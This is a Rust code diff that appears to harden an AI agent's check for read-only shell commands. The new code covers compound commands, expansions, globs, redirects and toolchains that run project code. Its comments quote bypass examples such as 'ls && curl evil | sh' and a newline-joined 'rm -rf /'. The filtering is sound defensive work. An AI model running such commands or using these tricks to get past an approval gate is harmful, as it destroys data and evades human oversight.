@@ -8,7 +8,18 @@
 
 /// Check if a command string is read-only (safe to auto-approve).
 ///
-/// Splits the command into words and delegates to argv-based checking.
+/// Two gates, both required:
+/// 1. The command contains no construct whose runtime effect can't be known
+///    statically ([`has_dynamic_or_control`]) — `$`-expansion / command
+///    substitution / process substitution / input or file-writing redirection
+///    / background `&` / newline-joined commands. TS mirrors:
+///    `containsUnquotedExpansion` + `validateRedirections` + `validateNewlines`.
+/// 2. Every subcommand of a `&&` / `||` / `;` / `|` compound has a read-only
+///    leading command — TS `readOnlyValidation.ts:1968-1983`
+///    `splitCommand(command).every(isCommandReadOnly)`. Inspecting only the
+///    first token would let `ls && curl evil | sh` (or `ls & curl evil`, or a
+///    newline-joined `ls\nrm -rf /`) auto-approve and skip the security gate.
+///
 /// Returns false if uncertain (conservative).
 pub fn is_read_only_command(command: &str) -> bool {
     let trimmed = command.trim();
@@ -16,12 +27,128 @@ pub fn is_read_only_command(command: &str) -> bool {
         return false;
     }
 
-    let argv = split_command_to_argv(trimmed);
-    if argv.is_empty() {
+    if has_dynamic_or_control(trimmed) {
         return false;
     }
 
-    is_safe_to_call(&argv)
+    let subcommands = crate::bash_permissions::split_compound_command(trimmed);
+    if subcommands.is_empty() {
+        return false;
+    }
+
+    subcommands.iter().all(|sub| {
+        let argv = split_command_to_argv(sub);
+        !argv.is_empty() && is_safe_to_call(&argv)
+    })
+}
+
+/// True if the command contains anything whose runtime effect can't be known
+/// from the static text, so it must NOT be auto-classified read-only and must
+/// fall through to the security/approval gate.
+///
+/// Quote semantics mirror TS `containsUnquotedExpansion`: single quotes
+/// suppress everything; double quotes still allow `$`/backtick expansion; a
+/// backslash escapes the next character everywhere except inside single quotes
+/// (where `\` is literal). Compound operators `&&` / `||` / `;` / `|` are
+/// allowed here — the splitter checks each subcommand separately.
+///
+/// Rejected (forces the approval gate):
+/// - `$` / backtick — variable / arithmetic / command substitution (TS
+///   `containsUnquotedExpansion`); active inside double quotes too.
+/// - unquoted `* ? [ ]` globs — can expand at runtime to a dangerous flag
+///   (`find . -de?ete`); TS `containsUnquotedExpansion` rejects these.
+/// - unquoted `{ } ( )` — brace expansion / subshell grouping: runtime-
+///   expandable or runs a subshell; TS excludes them from the safe-command
+///   regexes and rejects subshells via `bashCommandIsSafe`.
+/// - bare `&` background, redirections (`>` to a non-discard target, `<`,
+///   here-strings, process substitution), and newline-joined commands
+///   (TS `validateRedirections` + `validateNewlines`).
+fn has_dynamic_or_control(command: &str) -> bool {
+    let b = command.as_bytes();
+    let mut in_single = false;
+    let mut in_double = false;
+    let mut escaped = false;
+    let mut i = 0;
+    while i < b.len() {
+        let c = b[i];
+
+        // Backslash escapes the next char everywhere except inside single
+        // quotes, where `\` is literal (bash). Mirrors TS containsUnquotedExpansion.
+        if escaped {
+            escaped = false;
+            i += 1;
+            continue;
+        }
+        if c == b'\\' && !in_single {
+            escaped = true;
+            i += 1;
+            continue;
+        }
+
+        match c {
+            b'\'' if !in_double => in_single = !in_single,
+            b'"' if !in_single => in_double = !in_double,
+            // `$VAR` / `${...}` / `$[...]` / `$((...))` / `$(...)` and backtick
+            // substitution — active inside double quotes too.
+            b'$' | b'`' if !in_single => return true,
+            // Inside single quotes everything below is literal.
+            _ if in_single => {}
+            // Unquoted globs + brace/paren grouping — runtime-expandable.
+            b'*' | b'?' | b'[' | b']' | b'{' | b'}' | b'(' | b')' if !in_double => return true,
+            // Inside double quotes globs/control characters are literal.
+            _ if in_double => {}
+            b'&' => {
+                if b.get(i + 1) == Some(&b'&') {
+                    i += 1; // `&&` compound operator — allowed (splitter handles it)
+                } else if i > 0 && b[i - 1] == b'>' {
+                    // `>&N` fd duplication (e.g. `2>&1`, `>&2`) — not background.
+                } else {
+                    return true; // bare `&` background, or `&>` redirect-both
+                }
+            }
+            // Input redirect, here-string `<<<`, heredoc `<<`, process sub `<(`.
+            b'<' => return true,
+            // Newline-joined commands (TS validateNewlines).
+            b'\n' | b'\r' => return true,
+            // Output redirect: only side-effect-free discard targets are OK.
+            b'>' => {
+                if !redirect_target_is_discard(command, i) {
+                    return true;
+                }
+            }
+            _ => {}
+        }
+        i += 1;
+    }
+    false
+}
+
+/// Whether the `>`/`>>` redirect at byte index `gt` targets a discard
+/// (`/dev/null`) or fd-duplication (`>&2`), which have no filesystem effect.
+/// Everything else (incl. `cat foo>out`, `>>log`) is a real file write.
+fn redirect_target_is_discard(command: &str, gt: usize) -> bool {
+    let b = command.as_bytes();
+    let mut j = gt + 1;
+    if b.get(j) == Some(&b'>') {
+        j += 1; // `>>`
+    }
+    if b.get(j) == Some(&b'&') {
+        return true; // `>&2` / `>>&2` fd duplication
+    }
+    while matches!(b.get(j), Some(b' ' | b'\t')) {
+        j += 1;
+    }
+    if b.get(j) == Some(&b'&') {
+        return true; // `> &2`
+    }
+    let start = j;
+    while j < b.len()
+        && !b[j].is_ascii_whitespace()
+        && !matches!(b[j], b'>' | b'<' | b'|' | b';' | b'&')
+    {
+        j += 1;
+    }
+    &command[start..j] == "/dev/null"
 }
 
 /// Check if an argv array represents a safe (read-only) command.
@@ -87,18 +214,16 @@ fn is_safe_to_call(argv: &[&str]) -> bool {
         "curl" => is_safe_curl(argv),
         "wget" => is_safe_wget(argv),
 
-        // Development tools (read-only operations)
-        "cargo" => matches!(
-            argv.get(1).copied(),
-            Some("check" | "test" | "clippy" | "doc" | "build" | "bench" | "metadata")
-        ),
-
-        "npm" | "npx" | "yarn" | "pnpm" => matches!(
-            argv.get(1).copied(),
-            Some("test" | "run" | "list" | "ls" | "info" | "view" | "search" | "outdated")
-        ),
-
-        "python" | "python3" => matches!(argv.get(1).copied(), Some("-c" | "-m" | "--version")),
+        // Language / build toolchains execute arbitrary project code
+        // (cargo runs build.rs + tests, npm/yarn run package scripts,
+        // `python -c/-m` runs inline code), so they are NOT auto-approvable —
+        // only a bare version probe is. TS READONLY_COMMAND_REGEXES allowlists
+        // the ANCHORED `^python --version$` / `^node -v$` only, so trailing args
+        // must be rejected: `node -v --run build` runs the package script
+        // (node processes `--run` before `-v`). Require exact arity to mirror
+        // the `^...$` anchors. cargo/npm/npx/yarn/pnpm fall through to the gate.
+        "python" | "python3" => argv.len() == 2 && argv.get(1).copied() == Some("--version"),
+        "node" => argv.len() == 2 && matches!(argv.get(1).copied(), Some("-v" | "--version")),
 
         "docker" => is_safe_docker_command(argv),
         "gh" => is_safe_gh_command(argv),
